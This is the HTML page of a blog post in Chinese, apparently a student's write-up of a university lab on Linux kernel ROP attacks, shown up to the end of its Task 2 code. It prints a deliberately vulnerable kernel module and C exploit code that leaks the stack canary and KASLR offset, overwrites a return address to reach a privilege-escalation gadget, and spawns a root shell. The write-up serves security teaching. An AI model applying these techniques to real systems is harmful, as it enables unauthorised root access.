@@ -1,0 +1,482 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="ROP | Linux kernel attack and defence"><title>ROP | Linux内核攻防</title><link rel=canonical href=https://unicocn.github.io/p/rop/><link rel=stylesheet href=/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css><meta property="og:title" content="ROP | Linux内核攻防"><meta property="og:description" content="ROP | Linux kernel attack and defence"><meta property="og:url" content="https://unicocn.github.io/p/rop/"><meta property="og:site_name" content="Jiacheng Hu"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Security"><meta property="article:tag" content="Technology"><meta property="article:tag" content="Linux"><meta property="article:published_time" content="2023-06-07T22:50:00+00:00"><meta property="article:modified_time" content="2023-06-07T22:50:00+00:00"><meta property="og:image" content="https://unicocn.github.io/p/rop/cover.jpg"><meta name=twitter:title content="ROP | Linux内核攻防"><meta name=twitter:description content="ROP | Linux kernel attack and defence"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://unicocn.github.io/p/rop/cover.jpg"><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu1d23554e556787a34573de33aaa6d534_25919_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
+<span class=emoji>🇨🇳</span></figure><div class=site-meta><h1 class=site-name><a href=/>Jiacheng Hu</a></h1><h2 class=site-description>Student - Backend Developer - Blogger</h2></div></header><ol class=social-menu><li><a href=https://github.com/UnicoCN target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/about-me/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>About Me</span></a></li><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#task1绕过stack-canary和kaslr>Task1：绕过stack canary和KASLR</a></li><li><a href=#task2-修改return-address获取-root-权限>Task2: 修改return address，获取 root 权限</a></li><li><a href=#task3-rop-获取-root-权限>Task3: ROP 获取 root 权限</a></li><li><a href=#task4-linux内核对-rop-攻击的防护>Task4: Linux内核对 ROP 攻击的防护</a></li><li><a href=#思考题>思考题</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/rop/><img src=/p/rop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_800x0_resize_q75_box.jpg srcset="/p/rop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_800x0_resize_q75_box.jpg 800w, /p/rop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_1600x0_resize_q75_box.jpg 1600w" width=800 height=448 loading=lazy alt="Featured image of post ROP | Linux内核攻防"></a></div><div class=article-details><header class=article-category><a href=/categories/study/ style=background-color:#2a9d8f;color:#fff>Study</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/rop/>ROP | Linux内核攻防</a></h2><h3 class=article-subtitle>ROP | Linux kernel attack and defence</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Jun 07, 2023</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><h1 id=rop--linux内核攻防>ROP | Linux内核攻防</h1><blockquote><p>Link: <a class=link href=https://zjusec.gitee.io/syssec23-stu/lab2/ target=_blank rel=noopener>https://zjusec.gitee.io/syssec23-stu/lab2/</a></p></blockquote><h2 id=task1绕过stack-canary和kaslr>Task1：绕过stack canary和KASLR</h2><ol><li>首先根据实验指南，当我们<code>read</code>时，读取的是全局变量<code>prev_cmd</code>，而当我们<code>write</code>的时候，会将<code>buffer</code>先赋值给<code>cmd</code>，再将<code>cmd</code>赋值给<code>prev_cmd</code>；在<code>zjubof_write4</code>中，看似对<code>cmd.length</code>作出了限制，但是并没有对<code>len</code>作出限制，因此存在overflow漏洞，可以通过溢出修改<code>cmd.length</code>，进而将<code>canary/oldfp/ra</code>读到<code>prev_cmd</code>中</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>zjubof_write4</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span><span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>cmd_struct</span> <span class=n>cmd</span><span class=p>;</span>   
+</span></span><span class=line><span class=cl>    <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;zjubof_write4</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>cmd</span><span class=p>.</span><span class=n>command</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>.</span><span class=n>length</span> <span class=o>=</span> <span class=n>len</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>cmd</span><span class=p>.</span><span class=n>length</span> <span class=o>&gt;</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>cmd</span><span class=p>.</span><span class=n>length</span> <span class=o>=</span> <span class=mi>16</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>cmd</span><span class=p>.</span><span class=n>command</span><span class=p>,</span> <span class=n>buffer</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>prev_cmd</span><span class=p>,</span><span class=n>cmd</span><span class=p>.</span><span class=n>command</span><span class=p>,</span> <span class=n>cmd</span><span class=p>.</span><span class=n>length</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;cmd :%s len:%ld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>cmd</span><span class=p>.</span><span class=n>command</span><span class=p>,</span><span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>zjubof_write3</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span><span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;zjubof_write3</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>zjubof_write4</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>函数调用栈如下所示：</p><p><img src=/p/rop/image-20230529211914280.png width=594 height=455 srcset="/p/rop/image-20230529211914280_hu9af7c3d1e3967cbab122f626a2fd3d03_44781_480x0_resize_box_3.png 480w, /p/rop/image-20230529211914280_hu9af7c3d1e3967cbab122f626a2fd3d03_44781_1024x0_resize_box_3.png 1024w" loading=lazy alt="Image 1" class=gallery-image data-flex-grow=130 data-flex-basis=313px></p><ol start=2><li>触发buffer overflow的核心在于：</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>cmd</span><span class=p>.</span><span class=n>length</span> <span class=o>&gt;</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>.</span><span class=n>length</span> <span class=o>=</span> <span class=mi>16</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>// 尽管程序对于cmd.length作出了限制，但是并没有对len进行限制
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>memcpy</span><span class=p>(</span><span class=n>cmd</span><span class=p>.</span><span class=n>command</span><span class=p>,</span> <span class=n>buffer</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span> <span class=c1>// 通过buffer覆盖cmd.length
+</span></span></span><span class=line><span class=cl><span class=c1>// 此时cmd.length被修改，prev_cmd可以读取到canary/lr信息
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>memcpy</span><span class=p>(</span><span class=n>prev_cmd</span><span class=p>,</span><span class=n>cmd</span><span class=p>.</span><span class=n>command</span><span class=p>,</span> <span class=n>cmd</span><span class=p>.</span><span class=n>length</span><span class=p>);</span> 
+</span></span></code></pre></td></tr></table></div></div><p>因此我们可以构造buffer如下：</p><p><img src=/p/rop/image-20230529212113961.png width=687 height=470 srcset="/p/rop/image-20230529212113961_hu79328bc564a5f6dee0d09ac1cb868fe2_54418_480x0_resize_box_3.png 480w, /p/rop/image-20230529212113961_hu79328bc564a5f6dee0d09ac1cb868fe2_54418_1024x0_resize_box_3.png 1024w" loading=lazy alt="Image 2" class=gallery-image data-flex-grow=146 data-flex-basis=350px></p><p><code>buf[49] = "0123456789ABCDEF\x30"</code>，49 = 48 + 1,48为需要泄露的字节数，1为buf末尾的<code>\0</code></p><ol start=3><li>进而我们可以泄露<code>canary/lr/oldfp</code>，由于<code>lr(ra)</code>保存的是<code>zjubof_write2</code>中调用<code>zjubof_write3</code>之后的返回地址，反汇编<code>zjubof_write2</code>得到无偏移的RA，再与开启KASLR的<code>lr(ra)</code>相减即可得到偏移</li></ol><p><img src=/p/rop/image-20230529212840416.png width=572 height=498 srcset="/p/rop/image-20230529212840416_huaea8b7bea405384b97b0865fae1e70c2_78369_480x0_resize_box_3.png 480w, /p/rop/image-20230529212840416_huaea8b7bea405384b97b0865fae1e70c2_78369_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 3" class=gallery-image data-flex-grow=114 data-flex-basis=275px></p><p>关键代码如下:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>const</span> <span class=kt>size_t</span> <span class=n>RAWithoutKASLR</span> <span class=o>=</span> <span class=mh>0xffff800010de7d0c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>canaryStr</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// canary
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>char</span> <span class=n>oldFPStr</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// fp of zjubof_write2 
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>char</span> <span class=n>oldRAStr</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// ra of zjubof_write3 -&gt; zjubof_write2
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=kt>size_t</span> <span class=nf>getOffset</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>49</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;0123456789ABCDEF</span><span class=se>\x30</span><span class=s>&#34;</span><span class=p>;</span> <span class=c1>// cmd.command = &#34;0123456789ABCDEF&#34;, cmd.length = 0x30
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>    <span class=n>len</span> <span class=o>=</span> <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>24</span><span class=p>);</span> <span class=c1>// // 16 + 8 B
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>len</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>48</span><span class=p>);</span> <span class=c1>// CMD_LENGTH = 49, len &lt; 49
+</span></span></span><span class=line><span class=cl><span class=c1></span>    
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>canaryStr</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>canaryStr</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>canaryStr</span><span class=p>,</span> <span class=n>buf</span><span class=o>+</span><span class=mi>24</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>oldFPStr</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>oldFPStr</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>oldFPStr</span><span class=p>,</span> <span class=n>buf</span><span class=o>+</span><span class=mi>32</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>oldRAStr</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>oldRAStr</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>oldRAStr</span><span class=p>,</span> <span class=n>buf</span><span class=o>+</span><span class=mi>40</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>canary</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>canaryStr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>oldFP</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>oldFPStr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>oldRA</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>oldRAStr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>offset</span> <span class=o>=</span> <span class=n>oldRA</span> <span class=o>-</span> <span class=n>RAWithoutKASLR</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>结果</li></ol><p><img src=/p/rop/image-20230529212933009.png width=354 height=153 srcset="/p/rop/image-20230529212933009_hu8775550a8669ad711ce7e59bc80e655e_8390_480x0_resize_box_3.png 480w, /p/rop/image-20230529212933009_hu8775550a8669ad711ce7e59bc80e655e_8390_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 4" class=gallery-image data-flex-grow=231 data-flex-basis=555px></p><p>至此，我们成功泄露了canary和offset，之后就可以通过偏移量绕过<code>KASLR</code></p><h2 id=task2-修改return-address获取-root-权限>Task2: 修改return address，获取 root 权限</h2><ol><li>Task2要求我们修改<code>ra</code>，跳转到<code>first_level_gadget</code>，由<code>first_level_gadget</code>实现提权；我们先反汇编一下<code>first_level_gadget</code>，发现第一行代码修改了<code>sp</code>，而修改<code>ra</code>后返回时，<code>sp</code>已经被设置好了，如果此时跳转到第一行，<code>sp</code>再次被修改，就会导致栈空间出错，进而导致程序出错，因此需要跳到第二行</li></ol><p><img src=/p/rop/image-20230529213036319.png width=653 height=275 srcset="/p/rop/image-20230529213036319_hu23ebf3c8033e62768ab42c177b0f29f4_43300_480x0_resize_box_3.png 480w, /p/rop/image-20230529213036319_hu23ebf3c8033e62768ab42c177b0f29f4_43300_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 5" class=gallery-image data-flex-grow=237 data-flex-basis=569px></p><ol start=2><li>分析函数调用时<code>sp</code>的变化</li></ol><ul><li><code>zjubof_write</code> call <code>zjubof_write2</code>:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sp = sp - 220
+</span></span><span class=line><span class=cl># ...
+</span></span><span class=line><span class=cl>sp = sp + 220
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>zjubof_write2</code> call <code>zjubof_write3</code>:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sp = sp - 32
+</span></span><span class=line><span class=cl># ...
+</span></span><span class=line><span class=cl>sp = sp + 32
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>zjubof_write3</code> call <code>zjubof_write4</code>:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sp = sp - 80
+</span></span><span class=line><span class=cl># ...
+</span></span><span class=line><span class=cl>sp = sp + 80
+</span></span></code></pre></td></tr></table></div></div><p>当我们覆盖返回地址跳转到<code>first_level_gadget</code>时，<code>sp+80</code>和<code>sp+32</code>已经被执行，此时的<code>sp[0]</code>和<code>sp[8]</code>分别指向<code>zjubof_write</code>的<code>oldfp(x29)</code>和<code>ra(x30)</code>，在<code>first_level_gadget</code>中无需再将<code>x29</code>和<code>x30</code>压栈，同时为了在<code>first_level_gadget</code>执行完后能够正确返回到<code>zjubof_write</code>，需要手动添加指令将<code>sp+220</code></p><ol start=3><li>分析得到栈空间如下，并构造buffer</li></ol><p><img src=/p/rop/image-20230530005054928.png width=614 height=411 srcset="/p/rop/image-20230530005054928_hu225a97505a205ec0338465a7beb7278c_59561_480x0_resize_box_3.png 480w, /p/rop/image-20230530005054928_hu225a97505a205ec0338465a7beb7278c_59561_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 6" class=gallery-image data-flex-grow=149 data-flex-basis=358px></p><p>buffer的前24字节和Task1是一样的，但是需要将Task1中得到的<code>canary/oldfp</code>填入buffer的24-40字节，然后将新的返回地址填入40-48字节</p><ol start=4><li>关键代码及结果</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>hackUsingFirstLevelGadget</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>offset</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>49</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;0123456789ABCDEF</span><span class=se>\x30</span><span class=s>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>newRA</span> <span class=o>=</span> <span class=n>RAToFirstLevelGadget</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>24</span><span class=p>,</span> <span class=n>canaryStr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>32</span><span class=p>,</span> <span class=n>oldFPStr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>40</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>newRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>48</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
